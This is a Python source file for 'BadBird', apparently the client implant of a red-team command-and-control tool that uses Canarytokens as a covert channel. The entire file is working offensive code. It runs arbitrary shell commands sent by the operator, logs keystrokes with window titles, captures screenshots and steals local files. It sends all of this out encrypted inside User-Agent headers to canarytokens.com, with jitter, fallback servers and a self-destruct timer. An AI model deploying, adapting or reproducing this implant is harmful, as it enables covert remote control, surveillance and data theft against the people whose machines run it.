#!/usr/bin/env python3

# BadBird C2 Through Canarytokens
# Author: Austin Martin @amartinsec/blog.amartinsec.com
import base64
import os
import random
import subprocess
import sys
import threading
import time
from datetime import datetime, timedelta
import requests
import win32gui
from PIL import Image
from bs4 import BeautifulSoup
import mss
import mss.tools
from pynput.keyboard import Controller, Listener
from Cryptodome.Util.Padding import pad, unpad
from Cryptodome.Cipher import AES

keyboard = Controller()

# Globals
ua = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'
sleepTime = 3.0
jitter = 0.0
canaryManagementURL = ""
canaryPath = ["about", "feedback", "static", "terms", "articles", "images", "tags", "traffic"]
canaryEndpoint = ["index.html", "contact.php", "post.jsp", "submit.aspx"]
keys = ""
klogging = False
lastActiveWindow = ""
encrypted = True
BLOCK_SIZE = 128
selfdestuct = 168
hbtime = datetime.now()

#---------------Change Me---------------#
#-----------b'<32 length key>-----------#
key = b'badbirdbadbirdbadbirdbadbirdbadb'
#---------------------------------------#


def encrypt(message):
    if encrypted:
        try:
            cipher = AES.new(key, AES.MODE_ECB)
            encrypteddata = cipher.encrypt(pad(message,BLOCK_SIZE))
            encrypteddataunhex = encrypteddata.hex()
            return (encrypteddataunhex)

        except Exception as e:
            return "encryption error"
    else:
        return message


def decrypt(encrypteddata):
    if encrypted:
        try:
            encrypteddata = bytes.fromhex(encrypteddata)
            decipher = AES.new(key, AES.MODE_ECB)
            msg_dec = decipher.decrypt(encrypteddata)
            return unpad(msg_dec, BLOCK_SIZE)

        except Exception as e:
            return "decryption error"
    else:
        return encrypteddata

def on_press(key):
    if klogging:
        global keys
        global lastActiveWindow
        w = win32gui
        activeWindow = w.GetWindowText(w.GetForegroundWindow())

        # some nice formatting
        if (lastActiveWindow != activeWindow) and (lastActiveWindow != ""):
            now = datetime.now()
            date_time = now.strftime("%m/%d/%Y, %H:%M:%S")
            datetimepadders = "-" * int(((90 - (len(date_time) + 11)) / 2))
            if len(activeWindow) < 90:
                padders = (90 - len(activeWindow)) / 2
                keys = (keys + "\n\n" + "-" * int(padders) + activeWindow + "-" * int(padders) + "\n")
                keys = (keys + datetimepadders + "Date/Time: " + date_time + datetimepadders + "\n\n")

            else:
                keys = (keys + "\n\n" + activeWindow + "\n")
                keys = (keys + datetimepadders + "Date/Time: " + date_time + datetimepadders + "\n\n")

        lastActiveWindow = activeWindow

        string = str(key).replace("'", "")
        string = string.replace("Key.space", " ")
        string = string.replace("Key.enter", " <ENTER KEY>\n")
        string = string.replace("Key.backspace", " <BACKSPACE KEY> ")
        # string = string.replace("Key.", " Key.")
        keys = keys + string


def enableKeylogger():
    with Listener(on_press=on_press) as listener:
        listener.join()

def connect(url, managementURL):
    screenshotwarning = False
    sendfilewarning = False
    global klogging
    global keys
    global hbtime
    global canaryManagementURL
    threadKeystrokes = threading.Thread(target=enableKeylogger)

    # Fetch JSON results
    headers = {
        "User-Agent": ua.strip(),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close",
        "Upgrade-Insecure-Requests": "1"}
    response = requests.get(managementURL, headers=headers)

    try:
        cmdlist = []
        decodelist = []
        soup = BeautifulSoup(response.text, 'html.parser')
        data = soup.find_all("td")

        for tr in data:
            if "useragent" in tr.text:
                cmdlist.append(data[data.index(tr) + 1].text.strip())

        for count in cmdlist:
            try:
                cmd = base64.b64decode(decrypt(count)).decode('utf-8')

            except:
                pass

            if cmd.startswith("task:"):
                command = cmd.replace("task:", "")
                decodelist.append(command)

            # Fallback token
            if cmd.startswith("fallback:"):
                decodelist.append(cmd)

            if cmd.startswith("download:"):
                decodelist.append(cmd)

            if cmd.startswith("wificreds:"):
                decodelist.append(cmd)

            if cmd.startswith("self-destruct:"):
                global selfdestruct
                command = cmd.replace("self-destruct:", "")
                selfdestruct = command
                return

            # Changes implant sleeptime
            if cmd.startswith("stime:"):
                command = cmd.replace("stime:", "")
                global sleepTime
                global jitter
                sleepTime = command.split(":")[0]
                jitter = command.split(":")[1]
                return

            if cmd.startswith("keystart:"):
                if not klogging:
                    klogging = True
                    threadKeystrokes.start()
                command = cmd.replace("keystart:", "")
                return

            if cmd.startswith("keyfetch:"):
                decodelist.append("keyfetch:")

            if cmd.startswith("keystop:"):
                klogging = False
                command = cmd.replace("keystop:", "")
                return

            if cmd.startswith("task:pwdtask:"):
                decodelist.append(cmd)

            if cmd.startswith("saycheese:"):
                decodelist.append("saycheese:")

            if cmd.startswith("solongdirty:"):
                sys.exit(1)

            if cmd.startswith("solongclean:"):
                # have implant delete itself (TODO)
                sys.exit(1)

            if cmd.startswith("uploadingfile:"):
                decodelist.append(cmd)

        command = decodelist[-1]

    except Exception as e:
        pass

    try:
        if command.startswith("uploadingfile:"):
            command = cmd.replace("uploadingfile:", "")
            chunkedlen = int(command.split(":")[0])
            filename = command.split(":")[1]
            while True:
                # now we start the logic loop of grabbing ALL chunks and reassembling them
                reslist = []
                decodedlist = []
                chunkedlist = []
                trash = []
                response = requests.get(canaryManagementURL, headers=headers)
                soupChunk = BeautifulSoup(response.text, 'html.parser')
                trash = soupChunk.find_all("td")

                for x in trash:
                    if "useragent" in x.text:
                        chunkedlist.append(x.find_next_sibling().string.strip())

                # Loop until we have ALL the chunked data
                if (len(chunkedlist)) == (len(cmdlist) + chunkedlen):
                    stringbuilder = ""
                    holder = chunkedlist[:chunkedlen]
                    break

                else:
                    chunkedlist.clear()
                    trash.clear()

            # need to reverse the list
            holder.reverse()
            for q in holder:
                stringbuilder += q

            decodedlist.append(stringbuilder)
            # Need to sleep for large requests
            time.sleep(1)
            filebytes = decrypt(decodedlist[-1])
            filebytes = base64.b64decode(filebytes)


            with open(filename, "wb") as f:
                f.write(filebytes)
                f.close()


        if command.startswith("fallback:"):
            canaryManagementURL = cmd.replace("fallback:", "")
            main()

        # Adds command to #print working dir
        elif command.startswith("task:pwdtask:"):
            command = command.replace("task:pwdtask:", "")
            # hacky way to change directory since `cd <dir>` doesn't work with the subprocess module
            if "cd " in command:
                command = command.replace("cd ", "")
                os.chdir(command)
                output = "Changed directory successfully!"

            else:
                output = subprocess.check_output(command, shell=True)
                output = output.rstrip().lstrip().strip()
                output = output.decode('UTF-8')

            pwd = subprocess.check_output("cd", shell=True)
            pwd = pwd.decode('utf-8').rstrip()
            output = output.lstrip().strip()
            combined = "pwd:" + str(pwd) + ":res:" + str(output)
            b64 = base64.b64encode(combined.encode('UTF-8'))

        elif command.startswith("saycheese:"):
            screenshotwarning = True
            maxlen = 315000
            with mss.mss() as sct:
                monitors = sct.monitors[0]
                filename = sct.grab(monitors)
                # Resize image to max so that chunked requests will not be over 50 (b64 len of 343000)
                # This will get the best quality image while staying under 50 chunks
                # Need to split per monitor for better quality screenshots
                x = 1
                while True:
                    img = Image.frombytes("RGB", filename.size, filename.bgra, "raw", "BGRX")
                    img = img.resize((int(img.size[0] / x), int(img.size[1] / x)))
                    raw_bytes = mss.tools.to_png(img.tobytes(), img.size)
                    b64 = base64.b64encode(raw_bytes)
                    encryptedlen = encrypt(b64)
                    if len(encryptedlen) < maxlen:
                        break
                    else:
                        x += 1

        elif command.startswith("download:"):
            sendfilewarning = True
            try:
                requestedFile = command.split("download:")[1]
                with open(requestedFile, 'rb') as binary_file:
                    binary_file_data = binary_file.read()
                    b64 = base64.b64encode(binary_file_data)
                binary_file.close()
            except:
                # If file doesn't exist, send back error
                b64 = base64.b64encode("File not found".encode('UTF-8'))

        elif command.startswith("keyfetch:"):
            keys = (keys + "\n\n" + "-" * 90 + "\n\n")
            keys = ("keys:" + keys.strip())
            b64 = base64.b64encode(keys.encode('UTF-8'))
            # Reset keys after sent ot  server
            keys = ""

        else:
            # repeated hacky way as above to change directory since `cd <dir>` doesn't work with the subprocess module
            if "cd " in command:
                command = command.replace("cd ", "")
                os.chdir(command)
                output = "Changed directory successfully!"

            else:
                output = subprocess.check_output(command, shell=True)
                time.sleep(.5)
                output = output.decode('UTF-8').strip()

            output = output.lstrip().strip()
            output = "res:" + output
            b64 = base64.b64encode(output.encode('UTF-8'))

    except Exception as e:
        output = "res:Error with last ran command: " + str(e)
        b64 = base64.b64encode(output.encode('UTF-8'))
        pass


    # If data length is too long > 7000, split into multiple requests of 7000 chars
    # Due to the transaction codes (ex. "pic:") we need to trigger below even if file/screenshot does not have to be chunked
    placeholder = encrypt(b64)
    if len(placeholder) > 7000 or sendfilewarning or screenshotwarning:
        split = [placeholder[i:i + 7000] for i in range(0, len(placeholder), 7000)]
        length = len(split)
        hbtime = datetime.now()

        # If data will be sent in over 49 chunks, send warning that output cant be sent
        if len(split) >= 49:
            # If output to soo large (over 50 chunks), let server know it's a no-go
            toolong = base64.b64encode("toolong:".encode('UTF-8'))
            toolong = encrypt(toolong)
            headers = {"User-Agent": toolong,
                       "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                       "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close",
                       "Upgrade-Insecure-Requests": "1"}
            response = requests.get(url, headers=headers)
            return

        elif screenshotwarning:
            lengthwarn = "pic:" + str(length)
            screenshotwarning = False

        elif sendfilewarning:
            lengthwarn = "incomingfile:" + str(length)
            sendfilewarning = False

        else:
            lengthwarn = "chunked:" + str(length)

        # Warning the teamserver of length
        warining = base64.b64encode(lengthwarn.encode('UTF-8'))
        warining = encrypt(warining)
        headers = {"User-Agent": warining,
                   "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                   "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close",
                   "Upgrade-Insecure-Requests": "1"}
        response = requests.get(url, headers=headers)

        for i in split:
            headers = {"User-Agent": i,
                       "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                       "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close",
                       "Upgrade-Insecure-Requests": "1"}
            response = requests.get(url, headers=headers)


    # If data is less than above send in one request
    else:
        # Send response back to canary server
        hbtime = datetime.now()
        try:
            b64 = encrypt(b64)
            headers = {"User-Agent": b64,
                       "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                       "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close",
                       "Upgrade-Insecure-Requests": "1"}

            if command != "task:" or command != "":
                response = requests.get(url, headers=headers)

        except Exception as e:
            pass


# Initial check-in for tasking
def checkin(url):
    send = "hello"
    b64 = base64.b64encode(send.encode('UTF-8'))
    b64 = encrypt(b64)
    headers = {
        "User-Agent": b64,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close",
        "Upgrade-Insecure-Requests": "1"}
    response = requests.get(url, headers=headers)


def main():
    global canaryManagementURL
    global sleepTime
    global jitter
    global hbtime
    if canaryManagementURL == "":
        canaryManagementURL = input("[+] Enter Management URL: ")

    else:
        canaryManagementURL = canaryManagementURL.replace("task:", "")

    # Building a request for canarymanagement url
    start = "token="
    end = "&auth="
    # make a random path to use such as the canarytokens.org path
    path = random.choice(canaryPath)
    endpoint = random.choice(canaryEndpoint)

    url = ("http://canarytokens.com/" + path + "/" + canaryManagementURL[canaryManagementURL.index(start) + len(start):
                                                                         canaryManagementURL.index(
                                                                             end)] + "/" + endpoint)
    checkin(url)

    while True:
        try:
            # Check for last checkin time and end if after selfdestruct time
            if datetime.now() > (hbtime + timedelta(hours=selfdestuct)):
                sys.exit()

            # sleep before checking for new tasking. Modify with jitter value if enabled
            if float(jitter) <= 0:
                time.sleep(int(sleepTime))
            else:
                percent = float(jitter) / 100.0
                variation = percent * float(sleepTime)
                modifiedsleep = random.uniform(-variation, variation)
                time.sleep(float(sleepTime) + modifiedsleep)
            connect(url, canaryManagementURL)
        except Exception as e:
            pass


if __name__ == '__main__':
    main()
